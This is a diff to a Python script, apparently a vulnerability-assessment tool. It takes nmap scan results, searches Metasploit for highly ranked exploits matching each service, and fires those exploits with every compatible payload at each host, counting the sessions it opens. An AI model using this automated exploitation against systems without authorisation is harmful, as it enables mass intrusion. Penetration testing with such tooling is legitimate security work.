@@ -13,6 +13,7 @@ import time
 from pymetasploit3.msfrpc import *
 import pandas as pd
 import csv
+from io import StringIO
 
 startTime = datetime.now()
 # save the cwd for use later
@@ -76,38 +77,37 @@ f2.close()
 f3 = open(startDir + "/serviceDetails.txt","a+")
 f4 = open(startDir + "/cveDetails.txt","a+")
 
+# start at lport 49152 for modules to use (to be incremented later)
+lport = 49152
+
 # '/' is not platform independant and neither is 'cd' #
 def findModules(service, details, port, host):
     print("testing port:" + str(port) + " for host: " + host)
     hostDir = host.replace(".","-")
-    fullPath = startDir + '/' + hostDir # where we want to be
-    # console.write('cd /')
+    fullPath = os.path.join(startDir, hostDir) # where we want to be
     fullPathCMD = 'cd ' + fullPath
     outFile = service + str(port) + '.csv'
-    pwdCorrect = "False"
-    count = 0
-    while pwdCorrect == "False" and count < 5:
-        try:
-            console.write(fullPathCMD) # make sure we go to right directory first
-            while console.read()['busy'] == "True":
-                time.sleep(1)
-            pwdCorrect = "True"
-        except:
-            count += 1
-    if pwdCorrect == "False":
-        print("MSF could not get the directory right")
+    console.write(fullPathCMD) # make sure we go to right directory first
+    while console.is_busy() == True:
+        time.sleep(1)
+	# what we want to search msfconsole for now that in right directory
+    search = 'search ' + service + ' -S ' + details + ' type:exploit && rank:excellent || rank:good -o ' + outFile
+    try:
+        console.write(search) # actually perform the search for modules and store the output
+        while console.is_busy() == True:
+            time.sleep(1)
+        pathToFile = os.path.join(fullPath, outFile)
+        if os.path.exists(pathToFile) == True:
+        	while not os.access(pathToFile, os.R_OK | os.W_OK):
+        		print("   Hmmm file may be locked. Re-trying...")
+        		time.sleep(1)
+        else:
+        	print("  " + str(pathToFile) + " could not be located.")
+        	return "error"
+        return pathToFile
+    except Exception as e:
+        print("  error with search: " + str(e))
         return "error"
-    else:
-		# what we want to search msfconsole for now that in right directory
-        search = 'search ' + service + ' -S ' + details + ' type:exploit && rank:excellent || rank:good -o ' + outFile
-        try:
-            console.write(search) # actually perform the search for modules and store the output
-            while console.read()['busy'] == "True":
-                time.sleep(1)
-            return outFile
-        except:
-            print("  error with search")
-            return "error"
 
 
 def exploitHost(host):
@@ -123,57 +123,65 @@ def exploitHost(host):
 		dfLen = 0
 		service = str(nm[host]['tcp'][port]['name'])
 		details = str(nm[host]['tcp'][port]['product']) + " " + str(nm[host]['tcp'][port]['version'])
-		exploitFile = findModules(service, details, port, host)
-		if exploitFile == "error":
-			print("  no file returned from called method")
+		exploitFilePath = findModules(service, details, port, host)
+		if exploitFilePath == "error":
+			print("  No file returned from called method.")
 		else:
-			filePath = f"{startDir}/{hostDir}/{exploitFile}"
-			try: # checking to make sure we can read and write to file. Pandas randomly cant find files and maybe access lock is why?
-				while os.access(filePath, os.R_OK) == "False" or os.access(filePath, os.W_OK) == "False":
+			if os.path.exists(exploitFilePath) == True:
+				while not os.access(exploitFilePath, os.R_OK | os.W_OK):
 					print("   Hmmm file may be locked. Re-trying...")
 					time.sleep(1)
-				# initial read of file
-				df = pd.read_csv(filePath, skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name'])
-				dfLen = len(df.index)
-				if dfLen == 0: # if the file was read but says no modules
-					if os.stat(filePath).st_size > 46: # files with modules should be > 46 so we shoudlnt be having problems... PANDAS
-						print("  ****** why is df size 0! *******")
-						time.sleep(1)
-						df = pd.read_csv(filePath, skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name']) # try one more time
-						dfLen = len(df.index) # should be greater than 0 - modules will run after above print is made if this worked
-					else: # file was read, dfLen is 0, and file size is small so probably correct
-						dfLen = 0
-			except Exception as e:
-				if "does not exist" in str(e):
-					# lets make sure it actually doesnt exist and not just a pandas issue..
-					count = 0
-					while count < 3:
-						try:
-							print("  File was not found. Secondary attempt (" + str(count+1) + "/3)")
-							df = pd.read_csv(filePath, skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name'])
-							dfLen = len(df.index)
-							if dfLen == 0: # pandas found the file, now but says no modules so lets test it
-								if os.stat(filePath).st_size > 46: # size should be > 46 if contains any modules so try pandas read again
-									print("  ****** why is df size 0! (second) *******")
-									time.sleep(2)
-									df = pd.read_csv(filePath, skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name']) # try pandas read again
-									dfLen = len(df.index) # should be > 0 - modules will run after aove print is made if this worked
-								else:
-									print("  file size: " + str(os.stat(filePath).st_size)) # file has no modules
-									dfLen = 0
-									count = 4
-							count = 6 # exit the "getting a file not found" loop becasue it was found. The file may or may not have data though
-						except:
-							count += 1 # this will try 3 times if pandas keeps saying file does not exist
-					if count == 3: # got 3 file not founds so giving up
-						print("  MSF file could not be found by pandas.")
-						dfLen = 0
-				else: # some other error occured
+			else:
+				print("   File could not be found.")
+				break
+			# initial read of file
+			with open(exploitFilePath) as csvfile:
+				readCSV = csvfile.read()
+				df = pd.read_csv(StringIO(readCSV), skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name'])
+			dfLen = len(df.index)
+			if dfLen == 0: # if the file was read but says no modules
+				if os.stat(exploitFilePath).st_size > 46: # files with modules should be > 46 so we shoudnt be having problems... PANDAS
+					print("  ****** why is df size 0! *******")
+					time.sleep(1)
+					df = pd.read_csv(StringIO(readCSV), skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name']) # try one more time
+					dfLen = len(df.index) # should be greater than 0 - modules will run after above print is made if this worked
+				else: # file was read, dfLen is 0, and file size is small so probably correct
 					dfLen = 0
+					print("  No modules found")
+			# except Exception as e:
+			# 	if "does not exist" in str(e):
+			# 		# lets make sure it actually doesnt exist and not just a pandas issue..
+			# 		count = 0
+			# 		while count < 3:
+			# 			try:
+			# 				print("  File was not found. Secondary attempt (" + str(count+1) + "/3)")
+			# 				df = pd.read_csv(filePath, skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name'])
+			# 				dfLen = len(df.index)
+			# 				if dfLen == 0: # pandas found the file, now but says no modules so lets test it
+			# 					if os.stat(filePath).st_== size > 46: # size should be > 46 if contains any modules so try pandas read again
+			# 						print("  ****** why is df size 0! (second) *******")
+			# 						time.sleep(2)
+			# 						df = pd.read_csv(filePath, skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name']) # try pandas read again
+			# 						dfLen = len(df.index) # should be > 0 - modules will run after aove print is made if this worked
+			# 					else:
+			# 						print("  file size: " + str(os.stat(filePath).st_size)) # file has no modules
+			# 						dfLen = 0
+			# 						count = 4
+			# 				count = 6 # exit the "getting a file not found" loop becasue it was found. The file may or may not have data though
+			# 			except:
+			# 				count += 1 # this will try 3 times if pandas keeps saying file does not exist
+			# 		if count == 3: # got 3 file not founds so giving up
+			# 			print("  MSF file could not be found by pandas.")
+			# 			dfLen = 0
+			# 	else: # some other error occured
+			# 		print(e)
+			# 		dfLen = 0
 
-			if dfLen > 0:
+			else:
 				countMSMod = countMSMod + dfLen
 				for index, row in df.iterrows():
+					global lport
+					lport += 1 # increment lport so that modules arent trying to use the same lport
 					exploitName = row['Name'][8:]
 					print("  Attempting module: " + exploitName)
 					exploit2 = client.modules.use('exploit', exploitName)
@@ -193,34 +201,86 @@ def exploitHost(host):
 							except:
 								pass
 
-						for item in exploit2.missing_required:
-							print("    Item not set: " + item + ". Exiting exploit " + exploitName)
+						if len(exploit2.missing_required) > 0:
+							for item in exploit2.missing_required:
+								print("    Item not set: " + item)
+							print("    Exiting exploit: " + exploitName)
 							break
 
 						failedToRun = True
 						i = 0
-						while failedToRun is True and i <= len(exploit2.targetpayloads())-1:
+						while i <= len(exploit2.targetpayloads())-1:
 							try:
 								payload = exploit2.targetpayloads()[i]
 								payloadObj = client.modules.use('payload', payload)
+								try: # set remote host
+									payloadObj['RHOSTS'] = host
+								except:
+									try:
+										payloadObj['RHOST'] = host
+									except:
+										pass
+								try: # set port number
+									payloadObj['RPORT'] = port
+								except:
+									try:
+										payloadObj['RPORTS'] = port
+									except:
+										pass
+								try: # set port number
+									payloadObj['LPORT'] = lport
+								except:
+									try:
+										payloadObj['LPORTS'] = lport
+									except:
+										pass
+								try: # set port number
+									payloadObj['LHOST'] = IP
+								except:
+									try:
+										payloadObj['LHOST'] = IP
+									except:
+										pass
+								print("    Setting payload: " + payload)
+								if len(payloadObj.missing_required) > 0:
+									for item in payloadObj.missing_required:
+										print("      Item not set: " + item)
+									print("      Exiting payload: " + payload)
+									break
+
 								exploit2.execute(payload=payloadObj)
-								failedToRun = False
+								i += 1
+								result = 'Fail'
+
+								hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payload), 'Result':result}
+								exploitObjects.append(hostExploits)
+								#failedToRun = False
 							except:
 								i += 1
-								time.sleep(5)
+
 						result = 'Fail'
 
-						hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payload), 'Result':result}
-						exploitObjects.append(hostExploits)
+						# hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payload), 'Result':result}
+						# exploitObjects.append(hostExploits)
 					else:
 						print("  No payload selected for: " + exploitName)
-			else:
-				print("  No modules found") # No modules found for this service / port
+			# else:
+			# 	print("  No modules found") # No modules found for this service / port
+
+	# check that all modules (jobs) are complete
+	sleepCount = 0
+	while len(client.jobs.list) > 0 and sleepCount < 30:
+		print("There are: " + str(len(client.jobs.list)) + " jobs remaining.")
+		time.sleep(1)
+		sleepCount += 1
+
+	for job in client.jobs.list:
+		client.jobs.stop(job)
 
 
 	for index in client.sessions.list:
 		for item in exploitObjects:
-			if item["Port"] == str(client.sessions.list[index]['session_port']):
+			if item["Exploit"] in str(client.sessions.list[index]['via_exploit']) and item["Payload"] == str(client.sessions.list[index]['via_payload'][8:]):
 				item['Result'] = 'Success'
 
 	try:
@@ -328,7 +388,7 @@ for host in nm.all_hosts():
 		severity = 'Critical'
 		severityNum = 4
 
-	thisHost = {"IP":host, "Severity":severity, "SeverityNum":severityNum, "Criticals":countCritical, "Highs":countHigh, "Mediums":countMedium, "Lows":countLow, "Nones":countNone, "CVECount":cveCount, "OS":OS}
+	thisHost = {"IP":host, "Severity":severity, "SeverityNum":severityNum, "Criticals":countCritical, "Highs":countHigh, "Mediums":countMedium, "Lows":countLow, "Nones":countNone, "CVECount":cveCount, "MSTested":0, "MSSessions":0, "OS":OS}
 	hostObjects.append(thisHost)
 f3.close()
 
@@ -353,11 +413,13 @@ console = client.consoles.console(cid)
 
 for sys in hostObjects:
 	msTested, msSessions = exploitHost(sys["IP"])
+	sys["MSTested"] = msTested
+	sys["MSSessions"] = msSessions
 	if sys["SeverityNum"] == 4:
 		if printed4 == False:
 			printed4 = True
 			f.write("\n--- Vulnerability Level: Critical ---\n")
-			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
+			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], sys["MSTested"], sys["MSSessions"]))
 		else:
 			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
 	elif sys["SeverityNum"] == 3:
